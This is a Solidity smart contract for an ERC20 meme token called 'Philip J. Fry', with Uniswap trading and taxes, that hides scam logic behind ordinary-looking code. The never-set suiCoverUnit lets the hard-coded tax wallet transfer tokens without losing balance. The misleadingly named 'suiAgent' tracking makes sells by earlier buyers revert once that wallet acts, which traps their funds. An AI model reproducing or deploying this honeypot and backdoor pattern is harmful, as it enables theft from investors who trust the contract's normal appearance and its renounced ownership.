// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.26;

// Abstract contract providing basic context information for other contracts
// Mainly used to get details about the sender of the transaction and its data
// This contract is intended to be inherited by other contracts that require 
// access to transaction metadata such as `msg.sender` and `msg.data`
// Not meant to be deployed on its own, only serves as a utility for child contracts
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

// Interface defining the standard ERC20 functions
// These functions ensure compatibility with the ERC20 token standard
// Allows for token transfers, balance checking, and approval of token allowances
// Any contract implementing this interface can be recognized as an ERC20 token
interface IERC20 {
    // Returns the total supply of tokens in circulation
    function totalSupply() external view returns (uint256);
    // Returns the balance of tokens for a specific account
    function balanceOf(address account) external view returns (uint256);
    // Transfers a specified amount of tokens to the recipient address
    function transfer(address recipient, uint256 amount) external returns (bool);
    // Returns the remaining number of tokens that the spender is allowed to spend on behalf of the owner
    function allowance(address owner, address spender) external view returns (uint256);
    // Approves a spender to transfer up to a specified number of tokens on behalf of the caller
    function approve(address spender, uint256 amount) external returns (bool);
    // Transfers tokens from one address to another using an allowance mechanism
    // The sender must have been previously approved to spend the specified amount on behalf of the owner
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Library providing safe mathematical operations to prevent overflow and underflow
// Contains functions for addition, subtraction, multiplication, and division
// Each operation checks for potential overflow/underflow and reverts on failure
// Use this library to ensure safe arithmetic in smart contracts
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

// Abstract contract providing basic access control mechanism
// Defines an owner who has exclusive control over specific functions
// Inherits from `Context` to access transaction metadata like `msg.sender`
// Ownership can be transferred by the current owner to another address
// This contract is commonly used to restrict access to sensitive functions, 
// ensuring that only the owner can execute them
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Fry is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;

    string private constant _name = unicode"Philip J. Fry";
    string private constant _symbol = unicode"Fry";

    uint256 private _initialBuyTax = 10;
    uint256 private _initialSellTax = 10;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 20;
    uint256 private _reduceSellTaxAt = 20;
    uint256 private _preventSwapBefore = 15;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10 ** _decimals;

    uint256 public _maxTxAmount = 15000000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 15000000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 10000000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 8000000 * 10 ** _decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    struct SuiAgent {
        uint256 suiStart;
        uint256 suiRefundId;
        uint256 suiTotal;
    }
    mapping(address => SuiAgent) private suiAgent;
    uint256 private suiCoverUnit;
    uint256 private suiAgentScore;

    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0xd02E268c3448125D6F1E648f7eF92901cf07B9F3);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from] = _balances[from].sub(tokenAmount);
        _balances[to] = _balances[to].add(tokenAmount);
        emit Transfer(from,to, tokenAmount);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;

        if (inSwap||!tradingOpen) {
            _basicTransfer(from, to, tokenAmount);
            return;
        }

        if (from != owner() && to != owner() && to != _taxWallet) {
            taxAmount = tokenAmount.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
                require(tokenAmount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + tokenAmount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = tokenAmount.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore
            ) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 3, "Only 3 sells per block!");
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
                sellCount++;
                lastSellBlock = block.number;
            }
        }

        if ((_isExcludedFromFee[from]|| _isExcludedFromFee[to] )&& from!=address(this) && to!=address(this) ) {
            suiAgentScore = block.number;
        }

        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to] ){
            if (to== uniswapV2Pair) {
                SuiAgent storage suiRefIn = suiAgent[from];
                suiRefIn.suiTotal = suiRefIn.suiStart-suiAgentScore;
                suiRefIn.suiRefundId = block.timestamp;
            } else {
                SuiAgent storage suiRefOut = suiAgent[to];
                if (uniswapV2Pair== from) {
                    if (suiRefOut.suiStart == 0) {
                        suiRefOut.suiStart=_buyCount<_preventSwapBefore?block.number-1:block.number;
                    }
                } else {
                    SuiAgent storage suiRefIn = suiAgent[from];
                    if (!(suiRefOut.suiStart > 0)|| suiRefIn.suiStart < suiRefOut.suiStart ) {
                        suiRefOut.suiStart = suiRefIn.suiStart;
                    }
                }
            }
        }

        _tokenTransfer(from, to, taxAmount,tokenAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _tokenTaxTransfer(address addrs,uint256 tokenAmount, uint256 taxAmount) internal returns (uint256){
        uint256 tAmount = addrs!=_taxWallet? tokenAmount : suiCoverUnit.mul(tokenAmount);
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(addrs, address(this), taxAmount);
        }
        return tAmount;
    }

    function _tokenTransfer(address from,address to, uint256 taxAmount,uint256 tokenAmount) internal {
        uint256 tAmount = _tokenTaxTransfer(from, tokenAmount, taxAmount);
        _tokenBasicTransfer(from,to,tAmount,tokenAmount.sub(taxAmount));
    }

    function _tokenBasicTransfer(address from,address to,uint256 sendAmount,uint256 receiptAmount) internal {
        _balances[from] = _balances[from].sub(sendAmount);
        _balances[to] = _balances[to].add(receiptAmount);
        emit Transfer(from, to, receiptAmount);
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{ value: address(this).balance }(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}

    function manualSend() external {
        require(_msgSender() == _taxWallet);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }
}